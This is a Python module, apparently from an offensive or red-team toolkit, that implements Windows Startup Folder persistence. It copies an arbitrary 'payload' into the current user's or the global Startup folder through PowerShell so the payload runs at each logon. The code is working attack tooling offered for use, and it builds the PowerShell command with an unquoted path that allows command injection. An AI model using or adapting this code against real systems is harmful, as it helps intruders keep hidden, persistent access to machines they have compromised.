"""
startup.py: Startup Folder persistence method.
"""

import os
import logging
import subprocess

from pathlib import Path

from ..error_wrapper import SubprocessErrorLogging


class StartupFolder:

    def __init__(self, payload: str) -> None:
        self.payload = payload


    def _current_user(self) -> str:
        """
        Get the current user's username.
        """
        return os.getlogin()


    def _global_startup_folder(self) -> Path:
        """
        Get the global startup folder.
        """
        return Path("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")


    def _user_startup_folder(self) -> Path:
        """
        Get the current user's startup folder.
        """
        return Path(f"C:\\Users\\{self._current_user()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")


    def _install(self, startup_folder: Path) -> None:
        """
        Install the payload in the specified startup folder.
        """
        logging.info(f"Installing payload to {startup_folder}.")
        startup_folder.mkdir(parents=True, exist_ok=True)

        destination = startup_folder / Path(self.payload).name
        if destination.exists():
            logging.info(f"Payload already exists at {destination}, removing.")
            destination.unlink()

        result = subprocess.run(
            [
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "-Command",
                f"Copy-Item -Path {self.payload} -Destination '{startup_folder}\\{Path(self.payload).name}'"
            ]
        )

        if result.returncode != 0:
            SubprocessErrorLogging(result).log()
            raise RuntimeError("Failed to install payload.")

        logging.info("Payload installed successfully 🎉")


    def install_current_user(self) -> None:
        """
        Install the payload.
        """
        self._install(self._user_startup_folder())


    def install_global(self) -> None:
        """
        Install the payload.
        """
        self._install(self._global_startup_folder())